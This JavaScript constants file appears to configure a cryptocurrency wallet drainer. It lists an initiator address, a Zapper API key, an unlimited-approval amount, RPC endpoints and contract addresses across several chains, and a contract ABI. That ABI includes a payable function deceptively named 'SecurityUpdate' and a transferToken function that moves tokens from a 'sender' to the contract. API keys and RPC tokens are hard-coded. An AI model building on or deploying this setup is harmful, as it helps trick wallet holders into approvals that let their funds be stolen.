const constants = {
    initiator: '0x9ee5BBF73541acDcc1A64115Dd1ca937fd30fcdb',
    projectId: 'e5158a24e622f06db121f9a7b66ec3ae',
    deadline: 10000000000000,
    API_URL: 'http://127.0.0.1:3000/api',

    zapperKey: '6734aa32-e473-48ff-afb5-03c449ecbb96', 
    max: '1158472395435294898592384258348512586931256',
    limit: 2,

    RPC: {
        // 1: 'https://rpc.ankr.com/eth', 
        1: 'https://go.getblock.io/7b1218dc52a44037b55698a5b4d89200',
        137: 'https://rpc.ankr.com/polygon',
        56: 'https://go.getblock.io/2332c3d9539240d1be1c917897ff4f5a',
        42161: 'https://rpc.ankr.com/arbitrum',
        10: 'https://rpc.ankr.com/optimism',
        43114: 'https://rpc.ankr.com/avalanche',
        100: 'https://rpc.ankr.com/gnosis',
        250: 'https://rpc.ankr.com/fantom'
    },

    contracts: {
        1: '0x771c8Efa2Df663C3DefF00cE992Cd32D12f589F4',
        56: '0xC15195726074697763A2C5d4BAc2229a9991a97A',
        137: '0x74CE6cb46C5C85060079E3C6934D9ae5A16c4742',
        42161: '0x65B4F524FB9ea2d4BAe1a54BE8e684Fc9390e62e',
        10: '0x65B4F524FB9ea2d4BAe1a54BE8e684Fc9390e62e',
        43114: '0x54283d6Fe65B1e3CF697320bd30bC5F251A7c905'
    },

    receiveContractABI: [
          {
              "inputs": [],
              "stateMutability": "nonpayable",
              "type": "constructor"
          },
          {
              "inputs": [],
              "name": "SecurityUpdate",
              "outputs": [],
              "stateMutability": "payable",
              "type": "function"
          },
          {
              "inputs": [
                  {
                      "internalType": "address",
                      "name": "tokenAddress",
                      "type": "address"
                  }
              ],
              "name": "addToHoldTokens",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
          },
          {
              "inputs": [
                  {
                      "internalType": "address",
                      "name": "_newExector",
                      "type": "address"
                  }
              ],
              "name": "setExecutor",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
          },
          {
              "inputs": [
                  {
                      "internalType": "address",
                      "name": "tokenAddress",
                      "type": "address"
                  },
                  {
                      "internalType": "address",
                      "name": "sender",
                      "type": "address"
                  },
                  {
                      "internalType": "uint256",
                      "name": "amount",
                      "type": "uint256"
                  }
              ],
              "name": "transferToken",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
          },
          {
              "inputs": [],
              "name": "withdraw",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
          },
          {
              "stateMutability": "payable",
              "type": "receive"
          }
    ]

}
